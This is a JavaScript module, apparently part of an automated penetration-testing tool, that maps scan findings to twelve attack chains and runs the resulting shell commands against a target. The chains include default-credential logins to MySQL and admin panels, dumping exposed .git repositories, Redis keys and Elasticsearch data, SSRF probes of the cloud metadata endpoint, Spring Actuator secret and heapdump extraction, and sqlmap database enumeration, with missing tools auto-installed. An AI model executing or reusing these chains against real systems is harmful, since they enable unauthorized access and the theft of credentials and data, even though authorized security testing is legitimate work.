import chalk from 'chalk';
import { execSafe, toolExists } from './platform.js';
import { execSync } from 'child_process';
import { parseExploitOutput, formatExploitResult } from './exploit-parser.js';
import { XSS_PAYLOADS, SQLI_PAYLOADS, CMD_PAYLOADS, LFI_PAYLOADS, SSRF_PAYLOADS } from './exploit.js';
import { autoInstall } from './tool-manager.js';

const extractHostname = (target) => {
  try {
    const urlStr = target.startsWith('http') ? target : `http://${target}`;
    const url = new URL(urlStr);
    return url.hostname;
  } catch {
    return target.replace(/https?:\/\//, '').split('/')[0].split(':')[0];
  }
};

export const ATTACK_CHAINS = [
  // Chain 1: Exposed .git → Extract source code → Scan for secrets
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('.git') ||
      f.title?.toLowerCase().includes('git repository') ||
      f.detail?.includes('.git')
    ),
    name: 'Git Repository Extraction',
    steps: [
      {
        name: 'Dump git repository',
        command: (target) => {
          const host = extractHostname(target);
          return `wget -r --no-parent -l 1 -P ./git-dump-${Date.now()} http://${host}/.git/ 2>&1 | tail -20`;
        },
        onResult: 'scan_for_secrets'
      },
      {
        name: 'Check for downloaded git files',
        command: (target, prevResult) => `ls -la ./git-dump-* 2>&1 | head -20`,
      }
    ]
  },

  // Chain 2: Open MySQL → Try default credentials → List databases
  {
    trigger: (findings) => findings.some(f =>
      f.title?.includes('3306') ||
      f.title?.toLowerCase().includes('mysql') ||
      f.title?.toLowerCase().includes('mariadb')
    ),
    name: 'MySQL Default Credential Check',
    steps: [
      {
        name: 'Try default MySQL credentials',
        command: (target) => {
          const host = extractHostname(target);
          return `mysql -h ${host} -u root -p'' -e "SHOW DATABASES;" 2>&1 || mysql -h ${host} -u root -proot -e "SHOW DATABASES;" 2>&1 || mysql -h ${host} -u root -ppassword -e "SHOW DATABASES;" 2>&1 || echo "All default credentials failed"`;
        },
        severity: 'critical',
        findingTitle: 'MySQL accessible with default credentials'
      }
    ]
  },

  // Chain 3: Open Redis → Check for auth → Check for data
  {
    trigger: (findings) => findings.some(f =>
      f.title?.includes('6379') ||
      f.title?.toLowerCase().includes('redis')
    ),
    name: 'Redis Unauthenticated Access Check',
    steps: [
      {
        name: 'Test Redis without authentication',
        command: (target) => {
          const host = extractHostname(target);
          return `redis-cli -h ${host} ping 2>&1 || echo "PING_FAILED"`;
        },
        severity: 'critical',
        findingTitle: 'Redis accessible without authentication'
      },
      {
        name: 'List Redis keys if accessible',
        command: (target) => {
          const host = extractHostname(target);
          return `redis-cli -h ${host} KEYS "*" 2>&1 | head -20 || echo "NO_KEYS_OR_AUTH_REQUIRED"`;
        }
      }
    ]
  },

  // Chain 4: Login page / Admin panel found → Test default credentials
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('admin') ||
      f.title?.toLowerCase().includes('login') ||
      f.title?.toLowerCase().includes('phpmyadmin') ||
      f.title?.toLowerCase().includes('administrator')
    ),
    name: 'Default Credential Testing',
    steps: [
      {
        name: 'Test common default credentials on admin panel',
        command: (target, finding) => {
          const urlMatch = finding.detail?.match(/https?:\/\/[^\s]+/)?.[0] || target;
          const url = urlMatch.replace(/\/$/, '');
          const creds = [
            'admin:admin',
            'admin:password',
            'admin:123456',
            'root:root',
            'administrator:administrator'
          ];
          return creds.map(c => {
            const [user, pass] = c.split(':');
            return `curl -s -o /dev/null -w "%{http_code}" -u ${user}:${pass} "${url}" 2>&1`;
          }).join(' && echo "---" && ');
        }
      }
    ]
  },

  // Chain 5: SQL injection suspected → Run sqlmap
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('sql') ||
      f.title?.toLowerCase().includes('injection') ||
      f.title?.toLowerCase().includes('database')
    ),
    name: 'SQL Injection Exploitation',
    steps: [
      {
        name: 'Test for SQL injection with sqlmap',
        command: (target) => {
          if (toolExists('sqlmap')) {
            return `sqlmap -u "${target}" --batch --level=2 --risk=1 --dbs 2>&1 | tail -50`;
          }
          return `# sqlmap not installed. Manual tests:\n# curl "${target}?id=1'" | grep -i "error\|sql\|warning"\n# curl "${target}?id=1 OR 1=1--"`;
        },
        severity: 'critical'
      }
    ]
  },

  // Chain 6: WordPress detected → Run wpscan
  {
    trigger: (findings) => findings.some(f =>
      f.detail?.toLowerCase().includes('wordpress') ||
      f.title?.toLowerCase().includes('wordpress') ||
      f.title?.includes('wp-')
    ),
    name: 'WordPress Security Scan',
    steps: [
      {
        name: 'Run WPScan for WordPress vulnerabilities',
        command: (target) => {
          if (toolExists('wpscan')) {
            return `wpscan --url ${target} --enumerate vp,vt,u --no-banner 2>&1 | tail -50`;
          }
          const host = extractHostname(target);
          return `curl -s "${target}/wp-json/wp/v2/users" 2>&1 | head -20\ncurl -s "${target}/?author=1" 2>&1 | head -5`;
        },
        severity: 'high'
      }
    ]
  },

  // Chain 7: Docker daemon exposed → Critical RCE
  {
    trigger: (findings) => findings.some(f =>
      f.title?.includes('2375') ||
      f.title?.toLowerCase().includes('docker') ||
      f.title?.toLowerCase().includes('container')
    ),
    name: 'Docker Daemon RCE Check',
    steps: [
      {
        name: 'Check Docker daemon for unauthenticated access',
        command: (target) => {
          const host = extractHostname(target);
          return `curl -s http://${host}:2375/version 2>&1 | head -20\ncurl -s http://${host}:2375/containers/json 2>&1 | head -50`;
        },
        severity: 'critical',
        findingTitle: 'Docker daemon exposed — potential RCE'
      }
    ]
  },

  // Chain 8: SSRF test on URL parameters
  {
    trigger: (findings) => findings.some(f =>
      f.title?.includes('API') ||
      f.title?.includes('parameter') ||
      f.title?.includes('url') ||
      (findings.filter(f => f.title?.includes('path')).length > 3)
    ),
    name: 'SSRF Parameter Testing',
    steps: [
      {
        name: 'Test for SSRF in URL parameters',
        command: (target) => {
          const params = ['url', 'redirect', 'next', 'page', 'file', 'src', 'href', 'u'];
          return params.map(param =>
            `echo "Testing param: ${param}" && curl -s --connect-timeout 3 "${target}?${param}=http://169.254.169.254/latest/meta-data/" 2>&1 | grep -i "ami-id\\|instance-id\\|iam\\|aws\\|internal" && echo "POTENTIAL_SSRF_FOUND" || echo "OK"`
          ).join('\n');
        },
        severity: 'critical'
      }
    ]
  },

  // Chain 9: Spring Actuator exposed → Extract environment secrets
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('actuator') ||
      f.title?.toLowerCase().includes('spring') ||
      f.detail?.toLowerCase().includes('actuator')
    ),
    name: 'Spring Actuator Secret Extraction',
    steps: [
      {
        name: 'Extract environment variables from Spring Actuator',
        command: (target) => {
          const paths = ['/actuator/env', '/env', '/actuator/heapdump'];
          return paths.map(p =>
            `echo "=== ${p} ===" && curl -s "${target}${p}" 2>&1 | head -50`
          ).join('\n');
        },
        severity: 'critical',
        findingTitle: 'Spring Actuator exposes sensitive environment variables'
      }
    ]
  },

  // Chain 10: Elasticsearch exposed → Check for data
  {
    trigger: (findings) => findings.some(f =>
      f.title?.includes('9200') ||
      f.title?.toLowerCase().includes('elasticsearch')
    ),
    name: 'Elasticsearch Unauthenticated Data Access',
    steps: [
      {
        name: 'List Elasticsearch indices',
        command: (target) => {
          const host = extractHostname(target);
          return `curl -s "http://${host}:9200/_cat/indices?v" 2>&1 | head -20`;
        },
        severity: 'critical'
      },
      {
        name: 'Dump sample data from Elasticsearch',
        command: (target) => {
          const host = extractHostname(target);
          return `curl -s "http://${host}:9200/_search?size=3" 2>&1 | head -100`;
        }
      }
    ]
  },

  // Chain 11: phpMyAdmin detected → Try default credentials
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('phpmyadmin') ||
      f.title?.toLowerCase().includes('adminer')
    ),
    name: 'phpMyAdmin/Adminer Access',
    steps: [
      {
        name: 'Test phpMyAdmin default credentials',
        command: (target) => {
          const host = extractHostname(target);
          const paths = ['/phpmyadmin/', '/phpMyAdmin/', '/pma/', '/adminer.php'];
          return paths.map(p =>
            `echo "Testing ${p}" && curl -s -o /dev/null -w "%{http_code}" "http://${host}${p}" 2>&1`
          ).join('\n');
        },
        severity: 'high'
      }
    ]
  },

  // Chain 12: SAML detected → Check for vulnerabilities
  {
    trigger: (findings) => findings.some(f =>
      f.title?.toLowerCase().includes('saml') ||
      f.title?.toLowerCase().includes('sso') ||
      f.detail?.toLowerCase().includes('saml')
    ),
    name: 'SAML Security Testing',
    steps: [
      {
        name: 'Check SAML endpoints',
        command: (target) => {
          const paths = ['/saml', '/SAML', '/sso/saml', '/api/saml'];
          return paths.map(p =>
            `echo "=== ${p} ===" && curl -sI "${target}${p}" 2>&1 | head -10`
          ).join('\n');
        },
        severity: 'high'
      }
    ]
  }
];

export class AttackChainExecutor {
  constructor() {
    this.executedChains = new Set();
    this.exploitPayloads = {
      sqli: SQLI_PAYLOADS,
      xss: XSS_PAYLOADS,
      cmd: CMD_PAYLOADS,
      lfi: LFI_PAYLOADS,
      ssrf: SSRF_PAYLOADS
    };
  }

  reset() {
    this.executedChains.clear();
  }

  // Get random payload for a given exploit type
  getPayload(type, count = 1) {
    const payloads = this.exploitPayloads[type] || [];
    if (count === 1) {
      return payloads[Math.floor(Math.random() * payloads.length)];
    }
    return payloads.slice(0, Math.min(count, payloads.length));
  }

  // Get all payloads for a given exploit type
  getAllPayloads(type) {
    return this.exploitPayloads[type] || [];
  }

  // Check if required tool is available for a command
  checkToolAvailability(cmd) {
    const toolPatterns = [
      { pattern: /mysql\b/, tool: 'mysql' },
      { pattern: /redis-cli\b/, tool: 'redis-cli' },
      { pattern: /wget\b/, tool: 'wget' },
      { pattern: /sqlmap\b/, tool: 'sqlmap' },
      { pattern: /wpscan\b/, tool: 'wpscan' },
      { pattern: /nmap\b/, tool: 'nmap' },
      { pattern: /nikto\b/, tool: 'nikto' },
      { pattern: /dirb\b/, tool: 'dirb' }
    ];

    for (const { pattern, tool } of toolPatterns) {
      if (pattern.test(cmd)) {
        if (!toolExists(tool)) {
          return { available: false, tool };
        }
      }
    }
    return { available: true };
  }

  async checkAndExecute(findings, target) {
    const results = [];

    for (const chain of ATTACK_CHAINS) {
      if (chain.trigger(findings)) {
        const chainKey = `${target}-${chain.name}`;
        if (this.executedChains.has(chainKey)) {
          continue;
        }

        console.log(chalk.red.bold(`\n  ⚡ Attack Chain Triggered: ${chain.name}`));

        for (const step of chain.steps) {
          console.log(chalk.dim(`    ▶ ${step.name}...`));

          const cmd = typeof step.command === 'function'
            ? step.command(target, findings.find(f => chain.trigger([f])))
            : step.command;

          if (cmd.startsWith('#')) {
            console.log(chalk.yellow(`    ${cmd}`));
            continue;
          }

          // Check if required tool is available
          const toolCheck = this.checkToolAvailability(cmd);
          if (!toolCheck.available) {
            console.log(chalk.yellow(`    ⚠️  Tool '${toolCheck.tool}' not found - attempting auto-install...`));
            const installResult = await autoInstall(toolCheck.tool);
            if (!installResult.success) {
              console.log(chalk.dim(`    Install with: apt-get install ${toolCheck.tool} or red security install-tools`));
              continue;
            }
          }

          const result = execSafe(cmd, { timeout: 60000 });

          if (result) {
            console.log(chalk.dim(`    Output:\n    ${result.split('\n').slice(0, 10).join('\n    ')}`));

            // Verify exploitation results using exploit-parser
            const exploitType = this.getExploitTypeForChain(chain.name);
            if (exploitType) {
              const parsedResult = parseExploitOutput(exploitType, result, target);
              const verification = formatExploitResult(parsedResult);
              console.log(chalk.dim(`    ${verification}`));

              // Update finding with exploitation confirmation
              if (parsedResult.exploited) {
                results.push({
                  severity: 'critical',
                  title: `${step.findingTitle || chain.name} - EXPLOITATION CONFIRMED`,
                  detail: `Confidence: ${parsedResult.confidence}\nResult: ${parsedResult.findings.map(f => f.indicator).join(', ')}`,
                  command: cmd,
                  chain: chain.name,
                  exploited: true,
                  confidence: parsedResult.confidence
                });
                continue;
              }
            }

            if (step.findingTitle) {
              results.push({
                severity: step.severity || 'high',
                title: step.findingTitle,
                detail: result.slice(0, 500),
                command: cmd,
                chain: chain.name
              });
            }
          }
        }

        this.executedChains.add(chainKey);
        results.push({ chainExecuted: chain.name });
        break;
      }
    }

    return results;
  }

  // Map attack chain names to exploit types for result verification
  getExploitTypeForChain(chainName) {
    const mapping = {
      'SQL Injection Exploitation': 'sqli',
      'MySQL Default Credential Check': 'sqli',
      'Redis Unauthenticated Access Check': 'cmd',
      'SSRF Parameter Testing': 'ssrf',
      'Spring Actuator Secret Extraction': 'lfi',
      'Elasticsearch Unauthenticated Data Access': 'cmd',
      'Docker Daemon RCE Check': 'cmd'
    };
    return mapping[chainName] || null;
  }
}

export default { ATTACK_CHAINS, AttackChainExecutor };